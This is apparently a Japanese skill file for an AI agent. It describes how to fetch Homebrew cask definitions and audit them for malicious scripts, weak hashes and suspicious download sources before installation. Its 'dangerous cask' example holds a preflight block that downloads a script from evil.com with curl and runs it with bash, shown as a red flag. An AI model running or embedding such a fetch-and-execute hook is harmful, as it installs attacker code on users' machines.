---
name: homebrew-cask-security
description: Homebrew caskの定義ファイルを取得・分析し、インストール前に悪意のあるコードや疑わしい設定がないかをセキュリティチェックするスキル。ユーザーがbrew install --cask [app-name]でアプリをインストールする際の安全性を検証する。caskの定義に悪意が含まれていないか確認したい場合に使用する。
---

# Homebrew Cask Security Checker

## Overview

Homebrew caskの定義ファイルを取得し、セキュリティ観点から分析して、インストール前に悪意のあるコードや疑わしい設定がないかを検証する。cask定義の内容を体系的にチェックし、リスク評価レポートを生成する。

## When to Use

以下のような場合にこのスキルを使用する：

- ユーザーが「brew install --cask [app-name]のセキュリティをチェックして」と依頼した場合
- ユーザーが「[app-name]のcask定義に悪意があるか確認して」と依頼した場合
- ユーザーが特定のcaskの安全性について質問した場合
- 初めて使用するアプリケーションをHomebrewでインストールする前の確認

## Security Verification Workflow

### Step 1: Cask定義ファイルの取得

Homebrew公式リポジトリからcask定義ファイルを取得する。

```bash
# mcp__fetch__fetchツールを使用
https://raw.githubusercontent.com/Homebrew/homebrew-cask/master/Casks/[first-letter]/[cask-name].rb
```

**重要:** cask名の最初の文字でディレクトリが分かれている。例: `aqua-voice` → `Casks/a/aqua-voice.rb`

取得に失敗した場合、以下を確認:
- cask名のスペルミス
- caskが公式リポジトリに存在するか（`brew search [app-name]`で確認可能）
- caskが別のtap（サードパーティリポジトリ）に存在する可能性

### Step 2: Cask定義の構造分析

取得したcask定義を分析し、以下の要素を特定する：

```ruby
cask "app-name" do
  arch arm: "arm64", intel: "x64"          # アーキテクチャ対応
  version "x.y.z"                           # バージョン
  sha256 arm: "hash1", intel: "hash2"       # SHA256ハッシュ

  url "https://..."                         # ダウンロードURL
  name "App Name"                           # アプリ名
  desc "Description"                        # 説明
  homepage "https://..."                    # ホームページ

  # インストール定義
  app "App.app"                             # 基本的なアプリインストール
  pkg "installer.pkg"                       # PKGインストーラー
  installer manual: "Installer.app"         # 手動インストーラー

  # スクリプト（要注意）
  preflight do ... end                      # インストール前スクリプト
  postflight do ... end                     # インストール後スクリプト
  uninstall_preflight do ... end            # アンインストール前スクリプト
  uninstall_postflight do ... end           # アンインストール後スクリプト

  uninstall ...                             # アンインストール処理
  zap trash: [...]                          # 完全削除時のファイル
end
```

### Step 3: セキュリティチェック項目の評価

以下のチェックリストに基づいて、各項目を評価する。

#### ✅ 安全性の高い要素

1. **SHA256ハッシュの存在**
   - `sha256` フィールドが明示的に定義されている
   - arm64とintel両方のハッシュが記載されている（両対応の場合）
   - ハッシュによりファイルの整合性が検証可能

2. **シンプルなインストール処理**
   - `app "App.app"` のみの単純なインストール
   - 追加のスクリプトやコマンド実行がない
   - バイナリの直接実行がない

3. **標準的なzap設定**
   - 削除パスが以下の標準的な場所のみ:
     - `~/Library/Application Support/[App Name]`
     - `~/Library/Caches/com.[domain].[app]`
     - `~/Library/Logs/[App Name]`
     - `~/Library/Preferences/com.[domain].[app].plist`
   - システムディレクトリ（`/System`, `/usr`, `/Library`）への書き込みなし

4. **公式リポジトリの存在**
   - Homebrew/homebrew-cask公式リポジトリに収録
   - コミュニティレビュー済み

5. **verified ドメイン**
   - URLに `verified: "domain.com"` タグがある
   - Homebrewコミュニティが配布元を検証済み

#### ⚠️ 注意が必要な要素

1. **カスタムスクリプトの存在**
   - `preflight`, `postflight`, `uninstall_preflight`, `uninstall_postflight` ブロック
   - これらのスクリプト内容を詳細に確認する必要がある
   - 以下のような処理が含まれる場合は特に注意:
     - `system` コマンドの実行
     - ファイルのダウンロード
     - 環境変数の変更
     - シェルコマンドの実行

2. **PKGインストーラー**
   - `pkg "installer.pkg"` の使用
   - PKGファイルは実行前の検証が困難
   - インストール内容が不透明

3. **自動更新**
   - `auto_updates true` の設定
   - アプリが自動的に更新される
   - 更新時の新バージョン検証は各自で行う必要

4. **sudoを必要とするuninstall**
   - `uninstall` に `sudo: true` が含まれる場合
   - 管理者権限での操作が必要
   - アンインストール処理を確認

5. **カスタムURL/非標準CDN**
   - verifiedタグがない
   - 個人のサーバーやマイナーなCDN
   - ダウンロード元の信頼性を追加調査

#### 🚨 危険な要素（レッドフラグ）

1. **SHA256ハッシュの欠如**
   - `sha256 :no_check` の使用
   - ファイルの整合性が検証できない
   - 中間者攻撃のリスク

2. **疑わしいスクリプト操作**
   - システムディレクトリへの書き込み (`/usr/local`, `/Library`, `/System`)
   - 隠しファイルの作成 (`.`で始まるファイル)
   - `/tmp` 以外の一時ディレクトリへのファイル配置
   - バックグラウンドプロセスの起動
   - ネットワーク通信の実行

3. **不審なダウンロード元**
   - 個人のDropbox, Google Driveリンク
   - IPアドレス直接指定
   - HTTPプロトコル（HTTPSではない）
   - 短縮URL

4. **過度な権限要求**
   - rootユーザーでの実行
   - システム全体への影響

### Step 4: 開発者・企業の信頼性確認

アプリケーションの開発元の信頼性を確認する。以下の情報源を活用:

1. **公式サイトの確認**
   - `homepage` フィールドのURLを確認
   - HTTPS対応、有効なSSL証明書
   - 企業情報、連絡先の明記

2. **Web検索**
   - `mcp__brave-search__brave_web_search` を使用
   - アプリ名、開発元で検索
   - ユーザーレビュー、評判を確認

3. **信頼性の指標**
   - Y Combinator、有名VCからの投資
   - Hacker News、Redditでの議論
   - App Storeでの存在（Mac App Store）
   - オープンソース（GitHubでのスター数、コントリビューター）
   - 長期的な開発履歴

### Step 5: セキュリティ評価レポートの生成

以下の形式で評価結果をユーザーに報告する：

```markdown
## [App Name] Cask定義のセキュリティ評価

### ✅ 安全と判断できる要素

1. **[項目名]**
   - [具体的な内容]
   - [安全である理由]

### ⚠️ 注意すべき点

1. **[項目名]**
   - [具体的な内容]
   - [ユーザーが注意すべき理由]

### 🔍 Cask定義の分析結果

```ruby
[cask定義の重要部分を抜粋]
```

**悪意のあるコードは検出されませんでした / 以下の懸念点があります**

### 📊 総合評価

**リスクレベル: 低/中/高**

[総合的な判断と理由]

### 💡 推奨事項

1. **インストール前の確認**
   ```bash
   brew info --cask [cask-name]
   ```

2. **インストール後の確認**
   ```bash
   # アプリの署名を確認
   codesign -dv --verbose=4 "/Applications/[App Name].app"

   # 公証（notarization）を確認
   spctl -a -vv "/Applications/[App Name].app"
   ```

3. **初回起動時**
   - [アプリ固有の注意事項]
```

### Step 6: 結論と推奨

最後に明確な結論を提供:
- **安全**: 「このcask定義は安全です。brew install --cask [name]でインストールしても問題ありません。」
- **注意**: 「このcaskは基本的に安全ですが、[具体的な注意点]があります。」
- **危険**: 「このcaskには[具体的なリスク]があります。インストールは推奨しません。」

## Best Practices

### 検証の徹底性

- すべてのスクリプトブロック（preflight, postflight等）を詳細に分析
- URLの配布元を必ず確認
- 開発者の信頼性を複数の情報源で検証

### 透明性

- 検出した問題点を明確に説明
- リスクの程度を具体的に示す
- ユーザーが自身で判断できる情報を提供

### ツールの活用

- `mcp__fetch__fetch`: cask定義の取得、公式サイトの確認
- `mcp__brave-search__brave_web_search`: 開発元の評判調査
- cask定義の構文解析: Ruby構文の理解

## Common Patterns

### 典型的な安全なCask

```ruby
cask "example-app" do
  version "1.0.0"
  sha256 "abc123..."

  url "https://cdn.example.com/example-app-#{version}.dmg",
      verified: "cdn.example.com/"
  name "Example App"
  desc "Safe application"
  homepage "https://example.com/"

  app "Example App.app"

  zap trash: [
    "~/Library/Application Support/Example App",
    "~/Library/Caches/com.example.app",
  ]
end
```

### 注意が必要なCask（PKGインストーラー）

```ruby
cask "example-pkg" do
  version "1.0.0"
  sha256 "abc123..."

  url "https://example.com/installer.pkg"
  name "Example PKG"
  desc "Requires PKG installer"
  homepage "https://example.com/"

  pkg "installer.pkg"  # ← PKG形式は内容が不透明

  uninstall pkgutil: "com.example.app"
end
```

### 危険なCask（スクリプト実行）

```ruby
cask "suspicious-app" do
  version "1.0.0"
  sha256 :no_check  # ← SHA256チェックなし（危険）

  url "http://suspicious.com/app.dmg"  # ← HTTPSではない
  name "Suspicious App"

  preflight do
    system "curl -o /tmp/script.sh http://evil.com/script.sh"  # ← 外部スクリプトのダウンロード
    system "bash /tmp/script.sh"  # ← スクリプト実行
  end

  app "App.app"
end
```

## Notes

- このスキルはcask定義の静的分析のみを行う。アプリケーション本体のバイナリ解析は含まない
- 最終的な安全性の判断はユーザーの責任。このスキルは判断材料を提供する
- 新しい攻撃手法や脅威パターンは日々進化している。定期的な知識更新が必要
- 疑わしいcaskを発見した場合、Homebrewコミュニティへの報告を推奨
